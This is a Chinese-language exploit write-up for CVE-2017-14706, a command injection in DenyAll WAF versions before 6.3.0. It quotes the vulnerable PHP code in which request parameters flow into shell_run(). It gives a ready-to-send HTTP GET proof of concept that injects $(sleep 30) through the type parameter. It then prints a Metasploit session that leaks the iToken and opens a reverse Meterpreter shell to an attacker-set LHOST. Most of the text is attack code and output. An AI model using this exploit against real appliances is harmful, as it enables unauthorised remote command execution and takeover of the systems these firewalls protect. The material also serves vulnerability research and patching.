<html><head><meta charset="utf-8" /><style>.pydocx-caps {text-transform:uppercase}.pydocx-center {text-align:center}.pydocx-comment {color:blue}.pydocx-delete {color:red;text-decoration:line-through}.pydocx-hidden {visibility:hidden}.pydocx-insert {color:green}.pydocx-left {text-align:left}.pydocx-list-style-type-cardinalText {list-style-type:decimal}.pydocx-list-style-type-decimal {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedCircle {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedFullstop {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedParen {list-style-type:decimal}.pydocx-list-style-type-decimalZero {list-style-type:decimal-leading-zero}.pydocx-list-style-type-lowerLetter {list-style-type:lower-alpha}.pydocx-list-style-type-lowerRoman {list-style-type:lower-roman}.pydocx-list-style-type-none {list-style-type:none}.pydocx-list-style-type-ordinalText {list-style-type:decimal}.pydocx-list-style-type-upperLetter {list-style-type:upper-alpha}.pydocx-list-style-type-upperRoman {list-style-type:upper-roman}.pydocx-right {text-align:right}.pydocx-small-caps {font-variant:small-caps}.pydocx-strike {text-decoration:line-through}.pydocx-tab {display:inline-block;width:4em}.pydocx-underline {text-decoration:underline}body {margin:0px auto}</style></head><body><h1>（CVE-2017-14706）DenyAll WAF &lt; 6.3.0 远程命令执行漏洞</h1><h2>一、漏洞简介</h2><h2>二、漏洞影响</h2><p>DenyAll WAF &lt; 6.3.0</p><h2>三、复现过程</h2><h3>漏洞分析</h3><p>其实，DenyAll WAF中存在多处命令注入，其中一处为/webservices/stream/tail.php，以下是其中的一段代码：</p><p>if(isset($_REQUEST['iToken'])){<br />  if($local-&gt;getIToken()!=$_REQUEST['iToken']){<br />    exitPrint(t_("Bad key, authentication on slave streaming server failed"));<br />  }<br />}else{<br />  exitPrint(t_("Authentication on slave streaming server failed"));<br />}<br />if(isset($_REQUEST['tag']) &amp;&amp; $_REQUEST['tag']!=''){<br />  // on doit chercher le bon fichier<br />  if(isset($_REQUEST['stime'])&amp;&amp;$_REQUEST['stime']!=''){ // Start time version<br />    tailDateFile();<br />  }else{ // dernier fichier ouvert<br />    if($_REQUEST['tag']=='tunnel') $_REQUEST['file']=basename(shell_run(&quot;ls -1t &quot;.__RP_LOG__.&quot;*/&quot;.$_REQUEST['uid'].&quot;/*-&quot;.$_REQUEST['type'].&quot;.log| head -n1 2&gt;/dev/null&quot;));<br />    else $_REQUEST['file']=$_REQUEST['uid'].'-'.$_REQUEST['type'].'.log';<br />  }<br />}</p><p>在iToken可被泄露的情况下，这里又出现了另一个函数tailDateFile()，以下是其具体代码：</p><p>function tailDateFile(){<br />  global $_REQUEST;<br />  $stime=(int)($_REQUEST['stime']/1000);<br />  $tag=$_REQUEST['tag'];<br />  $uid=$_REQUEST['uid'];<br />  $type=$_REQUEST['type']; // access or error<br />  chdir(__RP_LOG__);<br />  if($tag=='tunnel'){ // reverse proxy<br />    $files=shell_run("ls -1 */$uid/*-$type-*.log 2&gt;/dev/null|sort")."\n"; // avec date trié au début<br />    $files.=shell_run("ls -1t */$uid/*-$type.log 2&gt;/dev/null"); // courant trié par utilisation<br />  }else{<br />    $files=shell_run("ls -1 $uid-$type*-log 2&gt;/dev/null|sort")."\n";<br />    $files.=shell_run("ls -1t $uid-$type.log 2&gt;/dev/null");<br />  }<br />  // .. CODE OMITTED ..<br />}</p><p>从以上代码可以看到，$uid参数可被控制，而且它还是shell_run()函数变量的一部分。结合上述提及的这两方面问题，我们就能实现未授权命令注入漏洞。</p><h3>PoC</h3><p>通过HTTP请求触发远程RCE实现：</p><p>GET /webservices/stream/tail.php?iToken=y760e0299ba6fc1a2739df5a8f64fc5a&amp;tag=tunnel&amp;stime=aaa&amp;type=aaa$(sleep%2030") HTTP/1.1<br />Host: www.0-sec.org:3001<br />User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.73 Safari/537.36<br />Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8<br />Accept-Language: en-US,en;q=0.5<br />Cookie: connect.sid=s%3AWGBO5SaeECriIG8z4SMjwilZgl7SM0ej.0hGC0CcXrwnoJLb4YucLi8lbr%2FC8f2TNIicG4EmFLFU<br />Connection: close<br />Upgrade-Insecure-Requests: 1</p><h3>Metasploit反弹控制模块</h3><p>https://github.com/rapid7/metasploit-framework/pull/8980</p><p>msf exploit(denyall_exec) &gt; set RHOST 35.176.123.128<br />RHOST =&gt; 35.176.123.128<br />msf exploit(denyall_exec) &gt; set LHOST 35.12.3.3<br />LHOST =&gt; 35.12.3.3<br />msf exploit(denyall_exec) &gt; check<br />[*] 35.176.123.128:3001 The target appears to be vulnerable.<br />msf exploit(denyall_exec) &gt; exploit<br />[-] Handler failed to bind to 35.12.3.3:4444:-  -<br />[*] Started reverse TCP handler on 0.0.0.0:4444<br />[*] Extracting iToken value from unauthenticated accessible endpoint.<br />[+] Awesome. iToken value = n84b214ad1f53df0bd6ffa3dcfe8059a<br />[*] Trigerring command injection vulnerability with  iToken value. <br />[*] Sending stage (40411 bytes) to 127.0.0.1  <br />[*] Meterpreter session 1 opened (127.0.0.1:4444 -&gt; 127.0.0.1:60556) at 2017-09-19 14:31:52 +0300<br /> <br />meterpreter &gt; pwd<br />/var/log/denyall/reverseproxy<br />meterpreter &gt; exit<br />[*] Shutting down Meterpreter... <br />[*] 172.31.11.218 - Meterpreter session 1 closed.  Reason: User exit<br />msf exploit(denyall_exec) &gt; exit    </p></body></html>